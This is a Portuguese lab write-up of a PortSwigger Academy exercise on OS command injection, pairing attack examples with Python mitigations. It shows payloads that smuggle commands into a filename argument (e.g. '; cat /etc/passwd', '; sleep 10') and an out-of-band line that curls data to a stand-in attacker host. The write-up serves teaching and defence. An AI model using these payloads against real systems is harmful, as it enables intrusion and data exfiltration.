# 💉 Command Injection – PortSwigger Web Security Academy

## 📋 Informações Gerais

| Item | Detalhe |
|------|----------|
| **Plataforma** | PortSwigger Web Security Academy |
| **Categoria** | Injeção de Código |
| **Nível de Dificuldade** | Practitioner |
| **Status** | ✅ Concluído |
| **Data** | Junho 2026 |
| **Ferramentas** | Burp Suite, Terminal |

---

## 🎯 Objetivo do Laboratório

Explorar Command Injection (injeção de comandos do sistema operacional), incluindo execução de comandos arbitrários, técnicas ciegas e extração de dados via requisições out-of-band.

---

## 📖 Resumo Executivo

Command Injection ocorre quando entrada do usuário é passada diretamente para interpretador de comandos do SO sem validação. Permite execução arbitrária de comandos com privilégios da aplicação.

---

## 📚 Conceitos Teóricos

### O que é Command Injection?

Ocorre quando:
```python
# ❌ VULNERÁVEL
filename = request.args.get('file')
os.system(f"rm {filename}")  # Atacante controla comando!
```

Atacante com entrada `file.txt; cat /etc/passwd` executa:
```bash
rm file.txt; cat /etc/passwd
# Primeiro deleta arquivo, depois lê dados sensíveis
```

### Separadores de Comando

- `; comando` — Unix/Linux/Mac
- `| comando` — Pipe (stdout → stdin)
- `& comando` — Background (Unix)
- `&& comando` — Executa se anterior sucesso
- `|| comando` — Executa se anterior falha
- `` `comando` `` — Command substitution
- `$(comando)` — Command substitution moderno
- `\n comando` — Nova linha (alguns contextos)

---

## 🧪 Técnicas Exploradas

### 1. Execução Básica

```bash
# Aplicação original
python analyze.py data.txt

# Injeção
data.txt; cat /etc/passwd
python analyze.py data.txt; cat /etc/passwd
```

---

### 2. Blind Command Injection com SLEEP

```bash
# Detectar via delay
data.txt; sleep 10

# Aplicação demora 10 segundos extras = vulnerável
```

---

### 3. Blind Command Injection com Out-of-Band

```bash
# Enviar dados para servidor controlado
data.txt; curl http://attacker.com/?data=$(whoami)

# Atacante recebe em logs:
# GET /?data=www-data
```

---

## 💥 Impacto Técnico

| Aspecto | Risco | Justificativa |
|---------|-------|---------------|
| **Confidencialidade** | 🔴 Alto | Leitura de arquivos sensíveis |
| **Integridade** | 🔴 Alto | Modificação/exclusão de arquivos |
| **Disponibilidade** | 🔴 Alto | Possível shutdown/reboot |
| **Privilégios Necessários** | Verde | Nenhum |
| **Tipo de Ataque** | Ativo | Execução direta |

---

## 🛡️ Mitigação & Defesa

### ✅ Implementação Segura

```python
# ❌ ERRADO - os.system
os.system(f"rm {filename}")

# ✅ CORRETO - subprocess com array (sem shell)
import subprocess
filename = "/tmp/file.txt"
subprocess.run(["rm", filename], check=True)
# Argumentos como array evitam injeção

# ✅ Alternativa com validação
import shlex
if not re.match(r'^[a-zA-Z0-9._-]+$', filename):
    raise ValueError("Filename inválido")
os.system(f"rm {shlex.quote(filename)}")
```

### Princípios

- [x] Usar subprocess com array, não shell
- [x] Input whitelist validation
- [x] Least privilege (usuário limitado)
- [x] Evitar shell quando possível
- [x] `shlex.quote()` se shell for necessário

---

## 🎓 Lições Aprendidas

### Insight 1: Separadores São Poderosos
A maioria dos ataques usa `;` ou `|` para encadear comandos.

### Insight 2: Ausência de Retorno Não Significa Segurança
Comand injection cega via `sleep` ou DNS ainda é exploração.

### Insight 3: Array vs String
`subprocess.run(["cmd", arg])` é seguro  
`subprocess.run(f"cmd {arg}", shell=True)` é perigoso

---

## 🔗 Referências

- **OWASP**: [Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- **CWE**: [CWE-78 - Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- **PortSwigger**: [OS Command Injection](https://portswigger.net/web-security/os-command-injection)

---

**Autor**: Aislan Silva  
**Status**: ✅ Documentado  
**Qualidade**: ⭐⭐⭐⭐⭐
